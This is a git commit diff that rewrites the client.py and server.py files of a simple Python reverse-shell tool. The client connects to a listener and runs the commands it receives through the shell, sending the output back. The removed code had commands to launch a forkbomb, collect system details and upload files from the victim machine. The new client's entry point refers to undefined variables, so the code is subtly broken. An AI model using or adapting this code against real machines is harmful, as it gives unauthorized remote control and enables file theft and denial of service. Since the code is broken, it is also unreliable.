5222eeba3865a9611edce0a2e8aa2be16ac9656a
Kritarth <kody-k@users.noreply.github.com>
2021-02-19 20:17:20 +0530

    It works now, Good Night...

--- client.py
+++ client.py
@@ -1,91 +1,35 @@
-import socket
-import subprocess
 import os
-import platform
-import getpass
-import colorama
-from colorama import Fore, Style
-from time import sleep
+import socket 
+import subprocess
+import sys
 
-colorama.init()
+def reciever(s):
+    while True:
+        cmd_bytes = s.recv(4096)
+        cmd = cmd_bytes.decode("utf-8")
+        if cmd.startswith("cd "):
+            os.chdir(cmd[3:])
+            s.send(b"$: ")
+            continue
+        if len(cmd) > 0:
+            p = subprocess.run(cmd, shell=True, capture_output=True)
+            data = p.stdout + p.stderr
+            s.sendall(data + b"$: ")
 
-RHOST = "127.0.0.1"
-RPORT = 2222
-
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect((RHOST, RPORT))
-
-while True:
+def connect(address):
     try:
-        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
-        sock.send(header.encode())
-        STDOUT, STDERR = None, None
-        cmd = sock.recv(1024).decode("utf-8")
+        s = socket.socket()
+        s.connect(address)
+        print("Connection Established.")
+        print(f"Address: {address}")
+    except socket.error as error:
+        print("An Error Occured")
+        print(error)
+        sys.exit
+    reciever(s)
 
-     	# List files in the dir
-        if cmd == "list":
-            sock.send(str(os.listdir(".")).encode())
-
-        # Forkbomb
-        if cmd == "forkbomb":
-            while True:
-                os.fork()
-
-        # Change directory
-        elif cmd.split(" ")[0] == "cd":
-            os.chdir(cmd.split(" ")[1])
-            sock.send("Changed directory to {}".format(os.getcwd()).encode())
-
-        # Get system info
-        elif cmd == "sysinfo":
-            sysinfo = f"""
-			Operating System: {platform.system()}
-			Computer Name: {platform.node()}
-			Username: {getpass.getuser()}
-			Release Version: {platform.release()}
-			Processor Architecture: {platform.processor()}
-            """
-            sock.send(sysinfo.encode())
-
- 		# Download files
-        elif cmd.split(" ")[0] == "download":
-            with open(cmd.split(" ")[1], "rb") as f:
-                file_data = f.read(1024)
-                while file_data:
-                    print("Sending", file_data)
-                    sock.send(file_data)
-                    file_data = f.read(1024)
-                sleep(2)
-                sock.send(b"DONE")
-            print("Finished sending data")
-
-        # Terminate the connection
-        elif cmd == "exit":
-            sock.send(b"exit")
-            break
-
- 		# Run any other command
-        else:
-            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            STDOUT, STDERR = comm.communicate()
-            if not STDOUT:
-                sock.send(STDERR)
-            else:
-                sock.send(STDOUT)
-
-        # If the connection terminates
-        if not cmd:
-            print("Connection dropped")
-            break
-    except Exception as e:
-        sock.send("An error has occured: {}".format(str(e)).encode())
-sock.close()
-
-
-
-
-
-
-
-
+if __name__ == "__main__":
+    RHOST = "127.0.0.1"
+    RPORT = 4444 
+    connect((host, port))
 
--- server.py
+++ server.py
@@ -1,40 +1,50 @@
 import socket
-import colorama
+import sys
 
-colorama.init()
+def send_commands(s, conn):
+    print("\nCtrl + C to kill the connection.")
+    print("Browse the system as usual.")
+    print("$: ", end="")
+    while True:
+        try:
+            cmd = input()
+            if len(cmd) > 0:
+                conn.sendall(cmd.encode())
+                data = conn.recv(4096) 
+                print(data.decode("utf-8"), end="")
+        except KeyboardInterrupt:
+            print("\nKilled The Connection")
+            conn.close()
+            sys.exit()
+        except Exception as e:
+            print(e)
+            conn.close()
+            e.close()
+            sys.exit()
 
-LHOST = "127.0.0.1"
-LPORT = 2222
+def server(address):
+    try:
+        s = socket.socket()
+        s.bind(address)
+        s.listen()
+        print("Server Initialized. Listening...")
+    except Exception as e:
+        print("\nAn Error Occured")
+        print(e)
+        restart = input("\nReinitialize the Server? y/n ")
+        if restart.lower() == "y" or restart.lower() == "yes":
+            print("\nRoger That. Reinitializing the server...\n")
+            server(address)
+        else:
+            print("\nKilling Myself...\n")
+            sys.exit()
+    conn, client_addr = s.accept()
+    print(f"Connection Established: {client_addr}")
+    send_commands(s, conn)
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind((LHOST, LPORT))
-sock.listen(1)
-print("Listening on port", LPORT)
-client, addr = sock.accept()
-
-while True:
-    input_header = client.recv(1024)
-    command = input(input_header.decode()).encode()
-
-    if command.decode("utf-8").split(" ")[0] == "download":
-        file_name = command.decode("utf-8").split(" ")[1][::-1]
-        client.send(command)
-        with open(file_name, "wb") as f:
-            read_data = client.recv(1024)
-            while read_data:
-                f.write(read_data)
-                read_data = client.recv(1024)
-                if read_data == b"DONE":
-                    break
-
-    if command is b"":
-        print("Please enter a command")
-    else:
-        client.send(command)
-        data = client.recv(1024).decode("utf-8")
-        if data == "exit":
-            print("Terminating connection", addr[0])
-            break
-        print(data)
-client.close()
-sock.close()
+if __name__ == "__main__":
+    LHOST = "127.0.0.1"
+    LPORT = 4444
+    server((LHOST, LPORT))
+        
+        
